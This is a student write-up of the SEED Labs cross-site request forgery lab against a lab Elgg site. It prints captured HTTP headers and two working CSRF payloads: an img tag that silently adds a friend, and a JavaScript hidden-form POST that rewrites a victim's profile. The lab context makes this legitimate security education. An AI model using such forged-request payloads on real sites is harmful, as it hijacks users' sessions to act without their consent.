# Cross-Site Request Forgery Attack Lab

## Motivation

Since our project will involve a similar attack to this (CSRF), we have decided to use this Seed Labs as preparation and research.

## Task 1: Observing HTTP Request

Inspecting the HTTP requests when `seed-server.com` is initiated through the HTTP Header Live add-on, we can observe two of them:

- Request GET

X-Content-Type-Options: nosniff
ETag: "1587931381-gzip"
Content-Encoding: gzip
Content-Length: 1759
Content-Type: application/javascript;charset=utf-8
Date: Mon, 11 March 2024 16:23:56 GMT
Cache-Control: no-cache, private
Vary: User-Agent
Server: Apache/2.4.41 (Ubuntu)

- Request POST

Host: www.seed-server.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Elgg-Ajax-API: 2
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=---------------------------139382037620708817074255733343
Content-Length: 695
Origin: http://www.seed-server.com
Connection: keep-alive
Referer: http://www.seed-server.com/
Cookie: Elgg=uaeqppra1jjncbjcjii6c3685p

## Task 2: CSRF Attack using GET Request

In this task, we are asked to add Samy to Alice's friends list through a link to his malicious website. To begin, we explore the malicious site `www.attacker32.com`. Clicking on the "Add-friend Attack" option redirects us to a blank page. Upon inspecting the code, we notice an empty `<img>` tag that we will use for our attack.

The next step is to understand how the HTTP request for a friend request in Eggl works. We log into Samy's account, send a friend request to Alice, and observe that the request, using the HTTP Live Header, follows this structure:

GET: http://www.seed-server.com/action/friends/add?friend=56&
(...)

Thus, we can identify the path structure the request follows, and the id for Alice is 56. We also need to discover Samy's id, so we create a new user, send a friend request to Samy, and find out his id is 59.

With this information, we can execute the attack. Accessing the attacker's container, we can modify pages on the malicious site, particularly the `addfriend.html` file. In this file, we use the `<img>` tag as suggested for CSRF:

```html
<img src="http://www.seed-server.com/action/friends/add?friend=59" alt="image" width="1" height="1" />
```

Finally, by clicking on the link of the malicious page, we can verify that Alice, who previously had no friends associated, now has Samy in her friends' list.


## Task 3: CSRF Attack using POST Request

In this task, we are asked to execute an attack that allows Samy to edit Alice's profile and write the message "Samy is my Hero." This attack is similar to the previous one, but now we need to recreate an HTTP POST request.

First, we need to understand how the information in this request is structured and presented. Editing Samy's profile, we observe the following request:

POST: http://www.seed-server.com/action/profile/edit
(...)

Next, we use a JavaScript script to create HTTP POST requests sent from the malicious website. The information about Alice gathered throughout these tasks is crucial for creating the following part of the script, representing fundamental sections of the HTTP POST requests:

```js
fields += "<input type='hidden' name='name' value='Alice'>";
fields += "<input type='hidden' name='briefdescription' value='Samy is my Hero!'>";
fields += "<input type='hidden' name='accesslevel[briefdescription]' value='2'>";         
fields += "<input type='hidden' name='guid' value='56'>";

// Create a <form> element.
var p = document.createElement("form");

// Construct the form
p.action = "http://www.seed-server.com/action/profile/edit";
p.innerHTML = fields;
p.method = "post";
```

Clicking the "Edit-Profile Attack" link on the malicious site, we observe that Alice's profile page is modified, displaying the message Samy intended to put there.

## Members

- Fabio Sá (up202007658@up.pt)
- Inês Gaspar (up202007210@up.pt)